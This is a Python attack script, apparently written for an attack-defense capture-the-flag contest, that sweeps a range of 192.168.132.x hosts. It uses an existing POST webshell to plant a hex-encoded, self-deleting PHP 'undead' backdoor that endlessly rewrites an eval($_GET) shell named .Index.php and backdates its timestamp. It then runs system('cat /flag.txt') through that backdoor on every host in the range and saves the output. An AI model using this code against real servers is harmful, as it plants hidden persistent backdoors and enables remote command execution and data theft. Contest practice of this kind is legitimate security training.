from urllib import request
import re
import requests
import re
from bs4 import BeautifulSoup
#连接post型预留木马进行内存马的注入
#需要的参数：1、原POST木马地址和参数  2、需要扫描的地址区间

def filter_tags(htmlstr):
    #先过滤CDATA
    re_cdata=re.compile('//<!\[CDATA\[[^>]*//\]\]>',re.I) #匹配CDATA
    re_script=re.compile('<\s*script[^>]*>[^<]*<\s*/\s*script\s*>',re.I)#Script
    re_style=re.compile('<\s*style[^>]*>[^<]*<\s*/\s*style\s*>',re.I)#style
    re_br=re.compile('<br\s*?/?>')#处理换行
    re_h=re.compile('</?\w+[^>]*>')#HTML标签
    re_comment=re.compile('<!--[^>]*-->')#HTML注释
    s=re_cdata.sub('',htmlstr)#去掉CDATA
    s=re_script.sub('',s) #去掉SCRIPT
    s=re_style.sub('',s)#去掉style
    s=re_br.sub('\n',s)#将br转换为换行
    s=re_h.sub('',s) #去掉HTML 标签
    s=re_comment.sub('',s)#去掉HTML注释
    blank_line=re.compile('\n+')
    s=blank_line.sub('\n',s)
    s=replaceCharEntity(s)#替换实体
    return s

def replaceCharEntity(htmlstr):
    CHAR_ENTITIES={'nbsp':' ','160':' ',
        'lt':'<','60':'<',
        'gt':'>','62':'>',
        'amp':'&','38':'&',
        'quot':'"','34':'"',}
 
    re_charEntity=re.compile(r'&#?(?P<name>\w+);')
    sz=re_charEntity.search(htmlstr)
    while sz:
        entity=sz.group()#entity全称，如>
        key=sz.group('name')#去除&;后entity,如>为gt
        try:
            htmlstr=re_charEntity.sub(CHAR_ENTITIES[key],htmlstr,1)
            sz=re_charEntity.search(htmlstr)
        except KeyError:
            #以空串代替
             htmlstr=re_charEntity.sub('',htmlstr,1)
             sz=re_charEntity.search(htmlstr)
    return htmlstr

def catflag():
    for i in range(30,40):
        try:
            i=str(i)
            IP='192.168.132.'
            NewIP=IP+i
            target = "http://"+NewIP+"/.Index.php?1998=system(%27\cat%20/flag.txt%27);"
            req = requests.get(url=target,timeout=2)
            html = req.text
            bf = str(BeautifulSoup(html))
            checks=filter_tags(bf)
            flag=('IP为:'+NewIP+':'+checks)
            N=flag.find('404 Not Found')
            if N<0:
                f.write(flag)
                print(flag)
            else:
                pass
        except:
            pass

def Nodead():
        for i in range(30,40):
            i=str(i)
            url = "http://192.168.132."+i+"/c.php"  #url后面的马按照已知马填写
            #下面的第一个是post木马的参数，第二个是写入不死马，不死马已经做了hex转换了，不死马名称为.checkder.php，当执行了不死马便会生成名称为.Index.php的get型木马，参数为1998
            cmd = {'c':"system('echo 3c3f706870200a69676e6f72655f757365725f61626f72742874727565293b0a7365745f74696d655f6c696d69742830293b0a756e6c696e6b285f5f46494c455f5f293b0a2466696c65203d20272e496e6465782e706870273b0a24636f6465203d2020273c3f70687020406576616c28245f4745545b313939385d293b3f3e273b0a7768696c65202831297b0a0966696c655f7075745f636f6e74656e7473282466696c652c24636f6465293b0a0973797374656d2827746f756368202d6d202d642022323032312d30312d31332031383a31303a313022202e496e6465782e70687027293b0a0975736c65657028313030293b0a7d0a3f3e|xxd -r -ps > .checkder.php');"}  #参数[a]  进行写入不死马
            # for i in range(1,255):
            try:
                r = requests.post(url,data=cmd,timeout=2)
                a=r.text
                if len(a)==0:
                    print(url+"<<<已插入木马")
                    urlTwo = "http://192.168.132."+i+"/.checkder.php"
                    r2 = requests.get(url=urlTwo,timeout=2)
                else:
                    pass
            except:
                pass

if __name__ =='__main__':
    print('Loading......')
    f=open('F:/Python3.0Work/AWD/flag.txt','w')
    Nodead()
    catflag()

